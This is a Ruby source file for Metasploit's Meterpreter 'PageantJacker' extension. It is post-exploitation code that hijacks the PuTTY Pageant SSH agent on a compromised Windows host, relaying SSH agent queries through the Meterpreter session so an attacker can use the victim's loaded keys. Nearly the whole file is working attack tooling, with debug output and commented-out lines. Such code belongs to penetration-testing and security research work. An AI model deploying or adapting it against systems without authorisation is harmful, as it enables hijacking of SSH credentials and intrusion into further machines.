# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/pageantjacker/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Pageantjacker

###
#
# PageantJacker extension - Hijack and interact with Pageant
#
# Stuart Morgan <stuart.morgan@mwrinfosecurity.com>
#
###

class Pageantjacker < Extension

  def initialize(client)
    super(client, 'pageantjacker')

    client.register_extension_aliases(
      [
        {
          'name' => 'pageantjacker',
          'ext'  => self
        },
      ])
  end

  def forward_to_pageant(blob,size)
        return unless size > 0
        return unless blob.size > 0
        puts "Request indicated size: #{size}"
        parse_blob(blob)

        packet_request = Packet.create_request('pageant_send_query')
        packet_request.add_tlv(TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN, size)
        packet_request.add_tlv(TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN, blob)
        
        response = client.send_request(packet_request)
        response_success = response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS)
        returned_blob = response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB)
        error = response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE)

        puts "Response success: #{response_success}, Response error #{error}"
        parse_blob(returned_blob)

        if response_success
#            puts "Received successful response: #{returned_blob.size}"
#            puts "Error is: #{error}"
#            puts returned_blob.unpack('NCH*')
            return returned_blob
        else
#            puts "Received error message: #{error}"
            return nil 
        end

        return nil
  end

  def parse_blob(blob)
    b = blob.unpack('NCH*')
    puts " blob size #{blob.size}"
    puts " blob data (20 chars: #{blob.unpack('H20').first}"
    puts "   ssh packet size: #{b[0]}"
    puts "   ssh type: #{b[1]}"
    puts "   ssh data: #{b[2]}"
  end

  def stop_listening
  end

end

end; end; end; end; end

